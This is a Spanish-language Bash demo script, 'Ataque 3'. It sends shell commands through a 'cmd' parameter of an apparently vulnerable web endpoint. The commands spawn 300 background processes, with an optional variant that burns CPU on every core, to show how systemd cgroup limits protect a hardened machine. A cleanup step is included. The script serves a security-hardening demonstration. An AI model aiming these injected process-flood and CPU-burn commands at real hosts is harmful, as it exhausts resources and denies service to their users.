#!/usr/bin/env bash
# =============================================================================
# ATAQUE 3 - SATURACION / DENEGACION DE SERVICIO (DoS)
# Prueba: limites de systemd -> TasksMax (nro de procesos), CPUQuota, MemoryMax
# Idea: una app comprometida intenta agotar los recursos de la maquina. El SO
#       blindado le pone un techo (cgroups) y el resto del sistema sigue vivo.
#
# NOTA DE SEGURIDAD: a proposito NO usamos una "fork bomb" clasica. Una fork
#       bomb real puede dejar la maquina sin proteccion colgada y obligar a
#       reiniciar en plena presentacion. En su lugar lanzamos una cantidad
#       GRANDE pero ACOTADA de procesos, y dejamos una limpieza lista. Prueba
#       el mismo limite (TasksMax) sin arriesgar la demo.
#
# IMPORTANTE (por que cada sleep lleva '>/dev/null 2>&1'):
#       Si no redirigimos su salida, los 300 sleep heredan la tuberia de la app
#       y la mantienen abierta; la app se queda esperando el fin de la lectura
#       y el curl NUNCA responde (se cuelga). Al mandar su salida a /dev/null,
#       sueltan la tuberia: la app responde al instante y los sleep igual siguen
#       corriendo en segundo plano.
# Uso:  ./ataque3.sh            (ataca localhost:8080)
#       ./ataque3.sh IP:PUERTO  (ataca otra maquina)
# =============================================================================

TARGET="${1:-localhost:8080}"
API="http://$TARGET/api/test"

echo "################ ATAQUE 3 - SATURACION (contra $TARGET) ################"
echo

# --- Parte principal: inundacion de procesos (prueba TasksMax) ---------------
echo ">> La app intentara lanzar 300 procesos en segundo plano."
echo ">> Maquina SIN proteccion: los crea todos."
echo ">> Maquina BLINDADA: choca con TasksMax (~100) y falla el resto."
echo "--------------------------------------------------------------"
curl -s -G "$API" --data-urlencode \
  'cmd=for i in $(seq 1 300); do sleep 300 >/dev/null 2>&1 & done; sleep 1; echo "Procesos del usuario ahora: $(ps -u $(whoami) --no-headers | wc -l)"'
echo
echo
echo ">> AHORA, en otra terminal de ESTA maquina, observa la evidencia:"
echo "     pgrep -u \$(whoami) -x sleep | wc -l   (conteo exacto de sleep)"
echo "     htop  -> F4, escribe 'sleep'           (verlos filtrados)"
echo "     journalctl -u digitalhealth -n 20      (en la blindada: systemd bloqueando)"
echo

read -p ">> Cuando termines de explicar, presiona ENTER para LIMPIAR... " _

# --- Limpieza: matar los procesos lanzados para devolver la maquina a normal -
curl -s -G "$API" --data-urlencode 'cmd=pkill -u $(whoami) -x sleep; echo "procesos sleep eliminados"'
echo
echo "################ FIN ATAQUE 3 ################"

# =============================================================================
# VARIANTE OPCIONAL (quema de CPU, prueba CPUQuota):
# Descomenta para mostrar como la maquina blindada limita la CPU al 80% mientras
# la desprotegida se va al 100% en todos los nucleos. Recuerda la limpieza.
#
# curl -s -G "$API" --data-urlencode \
#   'cmd=for i in $(seq 1 $(nproc)); do yes >/dev/null 2>&1 & done; echo "quemando CPU en $(nproc) nucleos; mira htop"'
# read -p "ENTER para apagar la quema de CPU... " _
# curl -s -G "$API" --data-urlencode 'cmd=pkill -u $(whoami) -x yes; echo "CPU liberada"'
# =============================================================================
